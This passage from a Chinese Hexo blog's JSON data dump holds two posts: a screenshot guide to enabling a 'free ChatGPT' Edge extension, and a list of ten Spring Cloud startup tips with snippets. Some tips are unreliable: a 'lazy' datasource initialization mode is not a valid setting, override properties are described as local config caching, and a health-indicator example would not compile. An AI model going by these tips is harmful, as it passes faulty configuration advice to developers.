Edge浏览器中使用免费的ChatGPT\"></a>Microsoft Edge浏览器中使用免费的ChatGPT</h1><h2 id=\"一、双击打开浏览器\"><a href=\"#一、双击打开浏览器\" class=\"headerlink\" title=\"一、双击打开浏览器 \"></a>一、双击打开浏览器 <img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/1.png\"></h2><p>找到：扩展，打开</p>\n<p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/2.png\"></p>\n<h2 id=\"二、打开Microsoft-Edge加载项\"><a href=\"#二、打开Microsoft-Edge加载项\" class=\"headerlink\" title=\"二、打开Microsoft Edge加载项\"></a>二、打开Microsoft Edge加载项</h2><p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/3.png\"></p>\n<h2 id=\"三、Move-tab新标签-获取免费ChatGPT\"><a href=\"#三、Move-tab新标签-获取免费ChatGPT\" class=\"headerlink\" title=\"三、Move tab新标签 获取免费ChatGPT\"></a>三、Move tab新标签 获取免费ChatGPT</h2><p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/4.png\"></p>\n<p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/5.png\"></p>\n<h2 id=\"四、启用Move-tab。启用ChatGPT。\"><a href=\"#四、启用Move-tab。启用ChatGPT。\" class=\"headerlink\" title=\"四、启用Move tab。启用ChatGPT。\"></a>四、启用Move tab。启用ChatGPT。</h2><p>扩展</p>\n<p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/6.png\"></p>\n<p>管理扩展</p>\n<p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/7.png\"></p>\n<p>启用</p>\n<p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/8.png\"></p>\n<h2 id=\"五、新建标签页，使用GPT\"><a href=\"#五、新建标签页，使用GPT\" class=\"headerlink\" title=\"五、新建标签页，使用GPT\"></a>五、新建标签页，使用GPT</h2><p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/9.png\"></p>\n<h2 id=\"六、使用举例\"><a href=\"#六、使用举例\" class=\"headerlink\" title=\"六、使用举例\"></a>六、使用举例</h2><p>提问</p>\n<p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/10.png\"></p>\n<p>GPT回复</p>\n<p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/11.png\"></p>\n<p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/12.png\"></p>\n","cover":"/img/liushui.png","cover_type":"img","excerpt":"","more":"<h1 id=\"Microsoft-Edge浏览器中使用免费的ChatGPT\"><a href=\"#Microsoft-Edge浏览器中使用免费的ChatGPT\" class=\"headerlink\" title=\"Microsoft Edge浏览器中使用免费的ChatGPT\"></a>Microsoft Edge浏览器中使用免费的ChatGPT</h1><h2 id=\"一、双击打开浏览器\"><a href=\"#一、双击打开浏览器\" class=\"headerlink\" title=\"一、双击打开浏览器 \"></a>一、双击打开浏览器 <img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/1.png\"></h2><p>找到：扩展，打开</p>\n<p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/2.png\"></p>\n<h2 id=\"二、打开Microsoft-Edge加载项\"><a href=\"#二、打开Microsoft-Edge加载项\" class=\"headerlink\" title=\"二、打开Microsoft Edge加载项\"></a>二、打开Microsoft Edge加载项</h2><p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/3.png\"></p>\n<h2 id=\"三、Move-tab新标签-获取免费ChatGPT\"><a href=\"#三、Move-tab新标签-获取免费ChatGPT\" class=\"headerlink\" title=\"三、Move tab新标签 获取免费ChatGPT\"></a>三、Move tab新标签 获取免费ChatGPT</h2><p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/4.png\"></p>\n<p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/5.png\"></p>\n<h2 id=\"四、启用Move-tab。启用ChatGPT。\"><a href=\"#四、启用Move-tab。启用ChatGPT。\" class=\"headerlink\" title=\"四、启用Move tab。启用ChatGPT。\"></a>四、启用Move tab。启用ChatGPT。</h2><p>扩展</p>\n<p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/6.png\"></p>\n<p>管理扩展</p>\n<p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/7.png\"></p>\n<p>启用</p>\n<p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/8.png\"></p>\n<h2 id=\"五、新建标签页，使用GPT\"><a href=\"#五、新建标签页，使用GPT\" class=\"headerlink\" title=\"五、新建标签页，使用GPT\"></a>五、新建标签页，使用GPT</h2><p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/9.png\"></p>\n<h2 id=\"六、使用举例\"><a href=\"#六、使用举例\" class=\"headerlink\" title=\"六、使用举例\"></a>六、使用举例</h2><p>提问</p>\n<p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/10.png\"></p>\n<p>GPT回复</p>\n<p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/11.png\"></p>\n<p><img src=\"/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/12.png\"></p>\n"},{"title":"10个优化SpringCloud启动时间的方法","date":"2024-06-16T14:52:00.000Z","_content":"\nSpring Cloud技术栈专家，真实场景下的Spring Cloud启动优化案例。Spring Cloud应用的启动性能优化通常涉及到减少启动时间和提高启动效率。下面是一些常见的优化场景：\n\n### 1\\. 懒加载配置\n\n**场景**：减少非必要服务的初始化时间。\n\n**调优**：使用Spring Boot的懒加载特性。\n\n**示例**：\n\n```\n  \n@SpringBootApplication  \npublic class MyApplication {  \n    public static void main(String[] args) {  \n        SpringApplication app = new SpringApplication(MyApplication.class);  \n        app.setLazyInitialization(true);  // 启用懒加载  \n        app.run(args);  \n    }  \n}  \n  \n\n```\n\n### 2\\. 禁用不需要的自动配置\n\n**场景**：应用中包含了未使用的自动配置。\n\n**调优**：显式排除不需要的自动配置类。\n\n最近无意间获得一份阿里大佬写的刷题笔记，一下子打通了我的任督二脉，进大厂原来没那么难。\n\n**示例**：\n\n```\n  \n@SpringBootApplication(exclude = {DataSourceAutoConfiguration.class})  \npublic class MyApplication {  \n    // 主方法...  \n}  \n  \n\n```\n\n### 3\\. 优化日志加载\n\n**场景**：日志框架的加载和配置耗时。\n\n**调优**：精简日志配置，避免复杂的日志处理。\n\n**示例**：在`application.properties`中添加：\n\n```\n  \nlogging.level.root=warn  # 设置日志级别为WARN减少日志输出  \n  \n\n```\n\n### 4\\. 限制组件扫描\n\n**场景**：组件扫描范围过广。\n\n**调优**：明确指定组件扫描的包路径。\n\n**示例**：\n\n```\n  \n@SpringBootApplication(scanBasePackages = \"com.example.myapp\")  \npublic class MyApplication {  \n    // 主方法...  \n}  \n  \n\n```\n\n### 5\\. 数据源懒加载\n\n**场景**：数据源初始化耗时。\n\n**调优**：将数据源设置为懒加载。\n\n**示例**：在`application.properties`中添加：\n\n```\npropertiesCopy code  \nspring.datasource.initialization-mode=lazy  # 设置数据源为懒加载  \n  \n\n```\n\n### 6\\. 减少JPA实体扫描\n\n**场景**：JPA实体数量多，启动扫描耗时。\n\n**调优**：减少实体扫描范围或延迟实体扫描。\n\n**示例**：\n\n```\n@EntityScan(basePackages = \"com.example.myapp.entity\")  \n@SpringBootApplication  \npublic class MyApplication {  \n    // 主方法...  \n}  \n  \n\n```\n\n### 7\\. 优化Spring Cloud配置中心启动\n\n**场景**：从配置中心加载配置耗时。\n\n**调优**：本地缓存配置中心数据。\n\n**示例**：在`bootstrap.properties`中添加：\n\n```\n  \nspring.cloud.config.allowOverride=true  \nspring.cloud.config.overrideNone=true  \n  \n\n```\n\n### 8\\. 使用JVM参数优化\n\n**场景**：JVM启动参数未优化。\n\n**调优**：使用合适的JVM参数提高启动速度。\n\n**示例**：在启动命令中添加：\n\n```\njava -Xmx256m -Xms256m -XX:TieredStopAtLevel=1 -jar myapp.jar  \n  \n\n```\n\n### 9\\. 优化健康检查机制\n\n**场景**：健康检查逻辑过于复杂。\n\n**调优**：简化或异步执行健康检查逻辑。\n\n**示例**：\n\n```\n@Component  \npublic class MyHealthIndicator implements HealthIndicator {  \n    @Override  \n    public Health health() {  \n        // 简化健康检查逻辑  \n    }  \n}  \n  \n\n```\n\n### 10\\. 减少Spring Cloud Gateway路由\n\n**场景**：Spring Cloud Gateway路由数量过多。\n\n**调优**：精简路由配置。\n\n**示例**：在`application.yaml`中配置：\n\n```\nspring:  \n  cloud:  \n    gateway:  \n      routes:  \n        - id: myroute  \n          uri: lb://myservice  \n          predicates:  \n            - Path=/myapi/**  \n  \n\n```\n\n### 总结\n\n以上是一些常见的Spring Cloud应用启动优化场景。请注意，这些优化措施需要根据实际应用的具体情况来调整。启动优化通常是一个权衡过程，需要在启动速度和应用性能之间找到平衡点。","source":"_posts/10个优化SpringCloud启动时间的方法.md","raw":"---\ntitle: 10个优化SpringCloud启动时间的方法\ndate: 2024-06-16 22:52:00\ntags: 优化SpringCloud启动时间\ncategories: 面试\n---\n\nSpring Cloud技术栈专家，真实场景下的Spring Cloud启动优化案例。Spring Cloud应用的启动性能优化通常涉及到减少启动时间和提高启动效率。下面是一些常见的优化场景：\n\n### 1\\. 懒加载配置\n\n**场景**：减少非必要服务的初始化时间。\n\n**调优**：使用Spring Boot的懒加载特性。\n\n**示例**：\n\n```\n  \n@SpringBootApplication  \npublic class MyApplication {  \n    public static void main(String[] args) {  \n        SpringApplication app = new SpringApplication(MyApplication.class);  \n        app.setLazyInitialization(true);  // 启用懒加载  \n        app.run(args);  \n    }  \n}  \n  \n\n```\n\n### 2\\. 禁用不需要的自动配置\n\n**场景**：应用中包含了未使用的自动配置。\n\n**调优**：显式排除不需要的自动配置类。\n\n最近无意间获得一份阿里大佬写的刷题笔记，一下子打通了我的任督二脉，进大厂原来没那么难。\n\n**示例**：\n\n```\n  \n@SpringBootApplication(exclude = {DataSourceAutoConfiguration.class})  \npublic class MyApplication {  \n    // 主方法...  \n}  \n  \n\n```\n\n### 3\\. 优化日志加载\n\n**场景**：日志框架的加载和配置耗时。\n\n**调优**：精简日志配置，避免复杂的日志处理。\n\n**示例**：在`application.properties`中添加：\n\n```\n  \nlogging.level.root=warn  # 设置日志级别为WARN减少日志输出  \n  \n\n```\n\n### 4\\. 限制组件扫描\n\n**场景**：组件扫描范围过广。\n\n**调优**：明确指定组件扫描的包路径。\n\n**示例**：\n\n```\n  \n@SpringBootApplication(scanBasePackages = \"com.example.myapp\")  \npublic class MyApplication {  \n    // 主方法...  \n}  \n  \n\n```\n\n### 5\\. 数据源懒加载\n\n**场景**：数据源初始化耗时。\n\n**调优**：将数据源设置为懒加载。\n\n**示例**：在`application.properties`中添加：\n\n```\npropertiesCopy code  \nspring.datasource.initialization-mode=lazy  # 设置数据源为懒加载  \n  \n\n```\n\n### 6\\. 减少JPA实体扫描\n\n**场景**：JPA实体数量多，启动扫描耗时。\n\n**调优**：减少实体扫描范围或延迟实体扫描。\n\n**示例**：\n\n```\n@EntityScan(basePackages = \"com.example.myapp.entity\")  \n@SpringBootApplication  \npublic class MyApplication {  \n    // 主方法...  \n}  \n  \n\n```\n\n### 7\\. 优化Spring Cloud配置中心启动\n\n**场景**：从配置中心加载配置耗时。\n\n**调优**：本地缓存配置中心数据。\n\n**示例**：在`bootstrap.properties`中添加：\n\n```\n  \nspring.cloud.config.allowOverride=true  \nspring.cloud.config.overrideNone=true  \n  \n\n```\n\n### 8\\. 使用JVM参数优化\n\n**场景**：JVM启动参数未优化。\n\n**调优**：使用合适的JVM参数提高启动速度。\n\n**示例**：在启动命令中添加：\n\n```\njava -Xmx256m -Xms256m -XX:TieredStopAtLevel=1 -jar myapp.jar  \n  \n\n```\n\n### 9\\. 优化健康检查机制\n\n**场景**：健康检查逻辑过于复杂。\n\n**调优**：简化或异步执行健康检查逻辑。\n\n**示例**：\n\n```\n@Component  \npublic class MyHealthIndicator implements HealthIndicator {  \n    @Override  \n    public Health health() {  \n        // 简化健康检查逻辑  \n    }  \n}  \n  \n\n```\n\n### 10\\. 减少Spring Cloud Gateway路由\n\n**场景**：Spring Cloud Gateway路由数量过多。\n\n**调优**：精简路由配置。\n\n**示例**：在`application.yaml`中配置：\n\n```\nspring:  \n  cloud:  \n    gateway:  \n      routes:  \n        - id: myroute  \n          uri: lb://myservice  \n          predicates:  \n            - Path=/myapi/**  \n  \n\n```\n\n### 总结\n\n以上是一些常见的Spring Cloud应用启动优化场景。请注意，这些优化措施需要根据实际应用的具体情况来调整。启动优化通常是一个权衡过程，需要在启动速度和应用性能之间找到平衡点。","slug":"10个优化SpringCloud启动时间的方法","published":1,"updated":"2024-06-16T14:53:16.327Z","comments":1,"layout":"post","photos":[],"_id":"clylh1rxt0003bsuhclrj1n5t","content":"<p>Spring Cloud技术栈专家，真实场景下的Spring Cloud启动优化案例。Spring Cloud应用的启动性能优化通常涉及到减少启动时间和提高启动效率。下面是一些常见的优化场景：</p>\n<h3 id=\"1-懒加载配置\"><a href=\"#1-懒加载配置\" class=\"headerlink\" title=\"1. 懒加载配置\"></a>1. 懒加载配置</h3><p><strong>场景</strong>：减少非必要服务的初始化时间。</p>\n<p><strong>调优</strong>：使用Spring Boot的懒加载特性。</p>\n<p><strong>示例</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">  </span><br><span class=\"line\">@SpringBootApplication  </span><br><span class=\"line\">public class MyApplication &#123;  </span><br><span class=\"line\">    public static void main(String[] args) &#123;  </span><br><span class=\"line\">        SpringApplication app = new SpringApplication(MyApplication.class);  </span><br><span class=\"line\">        app.setLazyInitialization(true);  // 启用懒加载  </span><br><span class=\"line\">        app.run(args);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-禁用不需要的自动配置\"><a href=\"#2-禁用不需要的自动配置\" class=\"headerlink\" title=\"2. 禁用不需要的自动配置\"></a>2. 禁用不需要的自动配置</h3><p><strong>场景</strong>：应用中包含了未使用的自动配置。</p>\n<p><strong>调优</strong>：显式排除不需要的自动配置类。</p>\n<p>最近无意间获得一份阿里大佬写的刷题笔记，一下子打通了我的任督二脉，进大厂原来没那么难。</p>\n<p><strong>示例</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">  </span><br><span class=\"line\">@SpringBootApplication(exclude = &#123;DataSourceAutoConfiguration.class&#125;)  </span><br><span class=\"line\">public class MyApplication &#123;  </span><br><span class=\"line\">    // 主方法...  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-优化日志加载\"><a href=\"#3-优化日志加载\" class=\"headerlink\" title=\"3. 优化日志加载\"></a>3. 优化日志加载</h3><p><strong>场景</strong>：日志框架的加载和配置耗时。</p>\n<p><strong>调优</strong>：精简日志配置，避免复杂的日志处理。</p>\n<p><strong>示例</strong>：在<code>application.properties</code>中添加：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">  </span><br><span class=\"line\">logging.level.root=warn  # 设置日志级别为WARN减少日志输出  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-限制组件扫描\"><a href=\"#4-限制组件扫描\" class=\"headerlink\" title=\"4. 限制组件扫描\"></a>4. 限制组件扫描</h3><p><strong>场景</strong>：组件扫描范围过广。</p>\n<p><strong>调优</strong>：明确指定组件扫描的包路径。</p>\n<p><strong>示例</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">  </span><br><span class=\"line\">@SpringBootApplication(scanBasePackages = &quot;com.example.myapp&quot;)  </span><br><span class=\"line\">public class MyApplication &#123;  </span><br><span class=\"line\">    // 主方法...  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-数据源懒加载\"><a href=\"#5-数据源懒加载\" class=\"headerlink\" title=\"5. 数据源懒加载\"></a>5. 数据源懒加载</h3><p><strong>场景</strong>：数据源初始化耗时。</p>\n<p><strong>调优</strong>：将数据源设置为懒加载。</p>\n<p><strong>示例</strong>：在<code>application.properties</code>中添加：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">propertiesCopy code  </span><br><span class=\"line\">spring.datasource.initialization-mode=lazy  # 设置数据源为懒加载  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-减少JPA实体扫描\"><a href=\"#6-减少JPA实体扫描\" class=\"headerlink\" title=\"6. 减少JPA实体扫描\"></a>6. 减少JPA实体扫描</h3><p><strong>场景</strong>：JPA实体数量多，启动扫描耗时。</p>\n<p><strong>调优</strong>：减少实体扫描范围或延迟实体扫描。</p>\n<p><strong>示例</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">@EntityScan(basePackages = &quot;com.example.myapp.entity&quot;)  </span><br><span class=\"line\">@SpringBootApplication  </span><br><span class=\"line\">public class MyApplication &#123;  </span><br><span class=\"line\">    // 主方法...  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"7-优化Spring-Cloud配置中心启动\"><a href=\"#7-优化Spring-Cloud配置中心启动\" class=\"headerlink\" title=\"7. 优化Spring Cloud配置中心启动\"></a>7. 优化Spring Cloud配置中心启动</h3><p><strong>场景</strong>：从配置中心加载配置耗时。</p>\n<p><strong>调优</strong>：本地缓存配置中心数据。</p>\n<p><strong>示例</strong>：在<code>bootstrap.properties</code>中添加：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">  </span><br><span class=\"line\">spring.cloud.config.allowOverride=true  </span><br><span class=\"line\">spring.cloud.config.overrideNone=true  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"8-使用JVM参数优化\"><a href=\"#8-使用JVM参数优化\" class=\"headerlink\" title=\"8. 使用JVM参数优化\"></a>8. 使用JVM参数优化</h3><p><strong>场景</strong>：JVM启动参数未优化。</p>\n<p><strong>调优</strong>：使用合适的JVM参数提高启动速度。</p>\n<p><strong>示例</strong>：在启动命令中添加：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -Xmx256m -Xms256m -XX:TieredStopAtLevel=1 -jar myapp.jar  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"9-优化健康检查机制\"><a href=\"#9-优化健康检查机制\" class=\"headerlink\" title=\"9. 优化健康检查机制\"></a>9. 优化健康检查机制</h3><p><strong>场景</strong>：健康检查逻辑过于复杂。</p>\n<p><strong>调优</strong>：简化或异步执行健康检查逻辑。</p>\n<p><strong>示例</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">@Component  </span><br><span class=\"line\">public class MyHealthIndicator implements HealthIndicator &#123;  </span><br><span class=\"line\">    @Override  </span><br><span class=\"line\">    public Health health() &#123;  </span><br><span class=\"line\">        // 简化健康检查逻辑  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"10-减少Spring-Cloud-Gateway路由\"><a href=\"#10-减少Spring-Cloud-Gateway路由\" class=\"headerlink\" title=\"10. 减少Spring Cloud Gateway路由\"></a>10. 减少Spring Cloud Gateway路由</h3><p><strong>场景</strong>：Spring Cloud Gateway路由数量过多。</p>\n<p><strong>调优</strong>：精简路由配置。</p>\n<p><strong>示例</strong>：在<code>application.yaml</code>中配置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">spring:  </span><br><span class=\"line\">  cloud:  </span><br><span class=\"line\">    gateway:  </span><br><span class=\"line\">      routes:  </span><br><span class=\"line\">        - id: myroute  </span><br><span class=\"line\">          uri: lb://myservice  </span><br><span class=\"line\">          predicates:  </span><br><span class=\"line\">            - Path=/myapi/**  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>以上是一些常见的Spring Cloud应用启动优化场景。请注意，这些优化措施需要根据实际应用的具体情况来调整。启动优化通常是一个权衡过程，需要在启动速度和应用性能之间找到平衡点。</p>\n","cover":"/img/hubian.png","cover_type":"img","excerpt":"","more":"<p>Spring Cloud技术栈专家，真实场景下的Spring Cloud启动优化案例。Spring Cloud应用的启动性能优化通常涉及到减少启动时间和提高启动效率。下面是一些常见的优化场景：</p>\n<h3 id=\"1-懒加载配置\"><a href=\"#1-懒加载配置\" class=\"headerlink\" title=\"1. 懒加载配置\"></a>1. 懒加载配置</h3><p><strong>场景</strong>：减少非必要服务的初始化时间。</p>\n<p><strong>调优</strong>：使用Spring Boot的懒加载特性。</p>\n<p><strong>示例</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">  </span><br><span class=\"line\">@SpringBootApplication  </span><br><span class=\"line\">public class MyApplication &#123;  </span><br><span class=\"line\">    public static void main(String[] args) &#123;  </span><br><span class=\"line\">        SpringApplication app = new SpringApplication(MyApplication.class);  </span><br><span class=\"line\">        app.setLazyInitialization(true);  // 启用懒加载  </span><br><span class=\"line\">        app.run(args);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-禁用不需要的自动配置\"><a href=\"#2-禁用不需要的自动配置\" class=\"headerlink\" title=\"2. 禁用不需要的自动配置\"></a>2. 禁用不需要的自动配置</h3><p><strong>场景</strong>：应用中包含了未使用的自动配置。</p>\n<p><strong>调优</strong>：显式排除不需要的自动配置类。</p>\n<p>最近无意间获得一份阿里大佬写的刷题笔记，一下子打通了我的任督二脉，进大厂原来没那么难。</p>\n<p><strong>示例</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">  </span><br><span class=\"line\">@SpringBootApplication(exclude = &#123;DataSourceAutoConfiguration.class&#125;)  </span><br><span class=\"line\">public class MyApplication &#123;  </span><br><span class=\"line\">    // 主方法...  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-优化日志加载\"><a href=\"#3-优化日志加载\" class=\"headerlink\" title=\"3. 优化日志加载\"></a>3. 优化日志加载</h3><p><strong>场景</strong>：日志框架的加载和配置耗时。</p>\n<p><strong>调优</strong>：精简日志配置，避免复杂的日志处理。</p>\n<p><strong>示例</strong>：在<code>application.properties</code>中添加：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">  </span><br><span class=\"line\">logging.level.root=warn  # 设置日志级别为WARN减少日志输出  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-限制组件扫描\"><a href=\"#4-限制组件扫描\" class=\"headerlink\" title=\"4. 限制组件扫描\"></a>4. 限制组件扫描</h3><p><strong>场景</strong>：组件扫描范围过广。</p>\n<p><strong>调优</strong>：明确指定组件扫描的包路径。</p>\n<p><strong>示例</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">  </span><br><span class=\"line\">@SpringBootApplication(scanBasePackages = &quot;com.example.myapp&quot;)  </span><br><span class=\"line\">public class MyApplication &#123;  </span><br><span class=\"line\">    // 主方法...  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-数据源懒加载\"><a href=\"#5-数据源懒加载\" class=\"headerlink\" title=\"5. 数据源懒加载\"></a>5. 数据源懒加载</h3><p><strong>场景</strong>：数据源初始化耗时。</p>\n<p><strong>调优</strong>：将数据源设置为懒加载。</p>\n<p><strong>示例</strong>：在<code>application.properties</code>中添加：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">propertiesCopy code  </span><br><span class=\"line\">spring.datasource.initialization-mode=lazy  # 设置数据源为懒加载  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-减少JPA实体扫描\"><a href=\"#6-减少JPA实体扫描\" class=\"headerlink\" title=\"6. 减少JPA实体扫描\"></a>6. 减少JPA实体扫描</h3><p><strong>场景</strong>：JPA实体数量多，启动扫描耗时。</p>\n<p><strong>调优</strong>：减少实体扫描范围或延迟实体扫描。</p>\n<p><strong>示例</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">@EntityScan(basePackages = &quot;com.example.myapp.entity&quot;)  </span><br><span class=\"line\">@SpringBootApplication  </span><br><span class=\"line\">public class MyApplication &#123;  </span><br><span class=\"line\">    // 主方法...  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"7-优化Spring-Cloud配置中心启动\"><a href=\"#7-优化Spring-Cloud配置中心启动\" class=\"headerlink\" title=\"7. 优化Spring Cloud配置中心启动\"></a>7. 优化Spring Cloud配置中心启动</h3><p><strong>场景</strong>：从配置中心加载配置耗时。</p>\n<p><strong>调优</strong>：本地缓存配置中心数据。</p>\n<p><strong>示例</strong>：在<code>bootstrap.properties</code>中添加：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">  </span><br><span class=\"line\">spring.cloud.config.allowOverride=true  </span><br><span class=\"line\">spring.cloud.config.overrideNone=true  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"8-使用JVM参数优化\"><a href=\"#8-使用JVM参数优化\" class=\"headerlink\" title=\"8. 使用JVM参数优化\"></a>8. 